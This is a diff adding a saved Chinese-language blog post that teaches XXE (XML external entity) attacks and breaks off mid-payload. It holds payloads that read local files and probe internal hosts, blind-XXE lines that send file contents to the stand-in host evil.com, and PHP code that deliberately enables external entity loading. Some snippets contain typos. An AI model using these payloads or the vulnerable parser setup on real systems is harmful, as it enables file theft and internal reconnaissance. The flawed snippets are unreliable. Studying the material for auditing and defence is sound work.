@@ -1,0 +1,1361 @@
+<!DOCTYPE html>
+<!-- saved from url=(0082)https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/ -->
+<html class="theme-next mist use-motion" lang="zh-Hans"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<script>
+(function(){
+ if(''){
+ if (prompt('请输入文章密码') !== ''){
+                 alert('密码错误！');
+                                 history.back();
+                                             
+ }
+         
+ }
+     
+ })();
+</script>
+
+
+  
+  
+    
+    
+  <script src="./XXE总结_XXE总结 _ v1rus blog_files/pace.min.js.下载"></script>
+  <link href="./XXE总结_XXE总结 _ v1rus blog_files/pace-mac-osx.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="./XXE总结_XXE总结 _ v1rus blog_files/jquery.fancybox.css" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="./XXE总结_XXE总结 _ v1rus blog_files/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+<link href="./XXE总结_XXE总结 _ v1rus blog_files/main.css" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="https://virusday.github.io/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="https://virusday.github.io/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="https://virusday.github.io/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="https://virusday.github.io/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="https://virusday.github.io/atom.xml" title="v1rus blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="之前老是遇到xxe的东西，在学了spring,strust,springmvc之后对配置文件的了解更深入了一点，想对xxe做一个比较系统的知识点回顾，沉淀一下这方面所学的一些点点滴滴的知识。 XML定义1、普通XML，在xml文档中使用 2、参数entity，在dtd文件中使用 XML漏洞存在的地方无论什么语言在涉及到对xml的处理时都有可能出现XXE相关的漏洞，所有在审计时最主要去==找对XML">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE总结/XXE总结">
+<meta property="og:url" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="v1rus blog">
+<meta property="og:description" content="之前老是遇到xxe的东西，在学了spring,strust,springmvc之后对配置文件的了解更深入了一点，想对xxe做一个比较系统的知识点回顾，沉淀一下这方面所学的一些点点滴滴的知识。 XML定义1、普通XML，在xml文档中使用 2、参数entity，在dtd文件中使用 XML漏洞存在的地方无论什么语言在涉及到对xml的处理时都有可能出现XXE相关的漏洞，所有在审计时最主要去==找对XML">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201118163703591.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201118165827197.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201119111508049.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201119111648336.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201119111705769.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201119120734859.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/20181120002647-e93bbf00-ec17-1.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/20181120002647-e965b74c-ec17-1.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201120002657149.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201120002808201.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201120113355504.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201120010610850.png">
+<meta property="article:published_time" content="2020-11-18T07:24:12.428Z">
+<meta property="article:modified_time" content="2020-11-22T07:42:15.614Z">
+<meta property="article:author" content="Virusday">
+<meta property="article:tag" content="Learn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/image-20201118163703591.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/">
+
+
+
+
+
+  <title>XXE总结/XXE总结 | v1rus blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/clipboard.js.下载"></script><script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/custom.js.下载"></script><style type="text/css">.fancybox-margin{margin-right:16px;}</style><style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+</style></head>
+
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans" class=" pace-done" style="padding-right: 320px;"><div class="pace  pace-inactive"><div class="pace-progress" data-progress-text="100%" data-progress="99" style="transform: translate3d(100%, 0px, 0px);">
+  <div class="pace-progress-inner"></div>
+</div>
+<div class="pace-activity"></div></div>
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader" translate="no">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="https://virusday.github.io/" class="brand" rel="start" style="opacity: 1;">
+        <span class="logo-line-before"><i class="" style="transform: translateX(100%);"></i></span>
+        <span class="site-title" style="opacity: 1; top: 0px;">v1rus blog</span>
+        <span class="logo-line-after"><i class="" style="transform: translateX(-100%);"></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle" style="opacity: 1; top: 0px;">做些有意思的事</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav" translate="no">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home" style="opacity: 1; transform: translateY(0px);">
+          <a href="https://virusday.github.io/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives" style="opacity: 1; transform: translateY(0px);">
+          <a href="https://virusday.github.io/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search" style="opacity: 1; transform: translateY(0px);">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block" style="opacity: 1; display: block;">
+    <link itemprop="mainEntityOfPage" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/">
+
+    <span hidden="" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Virusday">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/user.jpg">
+    </span>
+
+    <span hidden="" itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1rus blog">
+    </span>
+
+    
+      <header class="post-header" style="opacity: 1; display: block; transform: translateY(0px);">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XXE总结/XXE总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-18T15:24:12+08:00">
+                2020-11-18
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于:</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-11-22T15:42:15+08:00">
+                2020-11-22
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计:</span>
+                
+                <span title="字数统计">
+                  3.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 ≈</span>
+                
+                <span title="阅读时长">
+                  16
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody" style="opacity: 1; display: block; transform: translateY(0px);">
+
+      
+      
+
+      
+        <p>之前老是遇到xxe的东西，在学了spring,strust,springmvc之后对配置文件的了解更深入了一点，想对xxe做一个比较系统的知识点回顾，沉淀一下这方面所学的一些点点滴滴的知识。</p>
+<h2 id="XML定义"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#XML%E5%AE%9A%E4%B9%89" class="headerlink" title="XML定义"></a>XML定义</h2><p>1、普通XML，在xml文档中使用</p>
+<p>2、参数entity，在dtd文件中使用</p>
+<h2 id="XML漏洞存在的地方"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#XML%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E7%9A%84%E5%9C%B0%E6%96%B9" class="headerlink" title="XML漏洞存在的地方"></a>XML漏洞存在的地方</h2><p>无论什么语言在涉及到对xml的处理时都有可能出现XXE相关的漏洞，所有在审计时最主要去==找对XML的处理过程（包括了对参数的过滤）==，再关注一下==是否禁用了对外部实体的处理==。</p>
+<p>在web阶段学习spring框架的时候，对用户传入的参数很有可能使用了jackson调用json的处理方式，为xml时调用xml的处理方法，如果对xml没有进行过滤，就导致了用户输入xml时的问题。</p>
+<h2 id="XML注入"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#XML%E6%B3%A8%E5%85%A5" class="headerlink" title="XML注入"></a>XML注入</h2><h3 id="1、python-xxe"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#1%E3%80%81python-xxe" class="headerlink" title="1、python xxe"></a>1、python xxe</h3><p>​    1、首先判断python对xml处理使用了什么库，最常见的库是xml库。</p>
+<p>​    2、关注其中的pars方法，结合上述两点对xml漏洞处理的地方。（python3.7.1之后禁止了xml对外部实体的解析）</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> xml.sax</span><br><span class="line"></span><br><span class="line">x1 = <span class="string">"""&lt;?xml version="1.0" encoding="utf-8"?&gt; #注意这里version和encoding要空开</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE v1sec[</span></span><br><span class="line"><span class="string">    &lt;!ELEMENT methodname ANY&gt;</span></span><br><span class="line"><span class="string">    &lt;!ENTITY xxe SYSTEM "flie://etc/passwd"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;methodcall&gt;</span></span><br><span class="line"><span class="string">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; #注意分号</span></span><br><span class="line"><span class="string">&lt;/methodcall&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">x2 = <span class="string">"""&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE v1sec[</span></span><br><span class="line"><span class="string">    &lt;!ELEMENT methodname ANY&gt;</span></span><br><span class="line"><span class="string">    &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8005/xml.test"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;methodcall&gt;</span></span><br><span class="line"><span class="string">    &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span></span><br><span class="line"><span class="string">&lt;/methodcall&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyContentHandler</span><span class="params">(xml.sax.ContentHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        xml.sax.ContentHandler.__init__(self)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">startElement</span><span class="params">(self,name,attrs)</span>:</span></span><br><span class="line">        self.chars = <span class="string">""</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">endElement</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> name, self.chars</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">characters</span><span class="params">(self,content)</span>:</span></span><br><span class="line">        self.chars += content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = MyContentHandler()</span><br><span class="line"><span class="keyword">print</span> xml.sax.parseString(x1,parser)</span><br><span class="line"><span class="keyword">print</span> xml.sax.parseString(x2,parser)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第一种方式可以读取文件，第二种方式可以探测内网。</p>
+<p>先将端口监听打开，然后执行脚本</p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/image-20201118163703591.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/image-20201118163703591.png" alt="image-20201118163703591"></a></p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/image-20201118165827197.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/image-20201118165827197.png" alt="image-20201118165827197"></a></p>
+<p>python2.7环境下本地成功获取到python发送的请求。<br>python3.7将不再支持这样的语法。</p>
+<h3 id="2、Blind-XXE"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#2%E3%80%81Blind-XXE" class="headerlink" title="2、Blind XXE"></a>2、Blind XXE</h3><p>​    对于传统的XXE来说，要求有一点，就是攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件。</p>
+<p>​    但是往往源程序在解析完xml数据之后，不会将其中的内容进行输出，无法从返回结果中获取我们的内容。 此时可以利用blind xxe作为攻击方式，利用对xml实体的各种操作，来构建一条带外信道提取数据。</p>
+<p>​    实验基于burpsuit，hackbar可能会转义特殊字符导致报错找不到开始标志&lt;。</p>
+<h4 id="1、参数实体和内部参数实体"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#1%E3%80%81%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%92%8C%E5%86%85%E9%83%A8%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93" class="headerlink" title="1、参数实体和内部参数实体"></a>1、参数实体和内部参数实体</h4><p>​    主要使用了dtd约束中的参数实体和内部实体。<strong>参数实体</strong>是一种==只能在dtd中定义和使用的实体==，一般引用时使用%作为前缀。而<strong>内部实体</strong>是指在一个实体中定义的另一个实体，也就是嵌套实体。</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % param1 "&lt;!ENTITY internelEntity 'http://evil.com/evil.dtd'&gt;"&gt;</span></span><br><span class="line"><span class="meta">%param1;   #这里可能会找不到</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="meta">&lt;root&gt;</span></span><br><span class="line"><span class="meta">[This is my evilsite]&amp;internelEntity;</span></span><br><span class="line"><span class="meta">&lt;/root&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>​    但是内部实体的支持与否也是取决于解释器的。ie可以解析，但是现在的edge谷歌内核是不行的。</p>
+<h4 id="2、Blind-XXE原理"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#2%E3%80%81Blind-XXE%E5%8E%9F%E7%90%86" class="headerlink" title="2、Blind XXE原理"></a>2、Blind XXE原理</h4><p>​    带外数据通道的建立是使用嵌套的形式，利用外部实体中的url发出请求，从而和攻击者的服务器发生联系。</p>
+<p>​    1、实体中引用另一个实体行不通，2、内部实体嵌套的形式（不能在实体内部定义参数实体）3、将嵌套的实体声明放在到一个外部文件。</p>
+<p>sourcefile</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///C:/1.txt "&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://evil.com/evil.xml"&gt;</span></span><br><span class="line"><span class="meta">&amp;remote</span></span><br><span class="line"><span class="meta">&amp;all</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="meta">&lt;root&gt;</span></span><br><span class="line"><span class="meta">&amp;send</span></span><br><span class="line"><span class="meta">&lt;/root&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>evil.xml</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY send SYSTEM 'http://evil.com/evil.php?file=%file'&gt;;"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>evil.dtd(Document Type Definition )</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTIRY &amp;#x25; send SYSTEM 'http://evil.com/evil.php?file=%file'&gt;;"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>知识点总结：</p>
+<p>1、&amp;#x25 = &amp;#37 = % html实体编码，因为实体的值中不能有 %，否则会无法引用。 后面加分号！（否则报：CharRef: invalid decimal value）</p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/image-20201119111508049.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/image-20201119111508049.png" alt="image-20201119111508049"></a></p>
+<p>2、==重要==</p>
+<ul>
+<li>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li>
+<li>其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li>
+</ul>
+<p>基于报错回显，或者基于外带通道</p>
+<p>报错：</p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/image-20201119111648336.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/image-20201119111648336.png" alt="image-20201119111648336"></a></p>
+<p>外带通道：</p>
+<p><a href="./XXE总结_XXE总结 _ v1rus blog_files/image-20201119111705769.png" class="fancybox fancybox.image" rel="group"><img src="./XXE总结_XXE总结 _ v1rus blog_files/image-20201119111705769.png" alt="image-20201119111705769"></a></p>
+<h3 id="3、有回显的XXE利用cdata-character-data-进行数据包裹"><a href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#3%E3%80%81%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84XXE%E5%88%A9%E7%94%A8cdata-character-data-%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%8C%85%E8%A3%B9" class="headerlink" title="3、有回显的XXE利用cdata(character data)进行数据包裹"></a>3、有回显的XXE利用cdata(character data)进行数据包裹</h3><p>PCDATA 的意思是被解析的字符数据（parsed character data）。</p>
+<p>xml文件解析依赖于libxml库，但是libxml2.9以前的版本是默认支持外部实体的引用的。</p>
+<p>==xml文档中连续引用字符串实体拼接xml会报错，采用参数实体进行拼接==</p>
+<p><strong>php</strong></p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><strong>payload:</strong></p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">v1rus</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;![CDATA["</span>&gt;</span>   #字符串引用 &lt;![CDATA[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///d:/test.txt"</span>&gt;</span>  #这个也是字符串</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">"]]&gt;"</span>&gt;</span>     #字符串引用 ]]&gt;</span>  做到了字符串拼接形成cdata包裹数据</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/evil.dtd"</span>&gt;</span> </span><br><span class="line">%dtd; ]&gt; </span><br><span 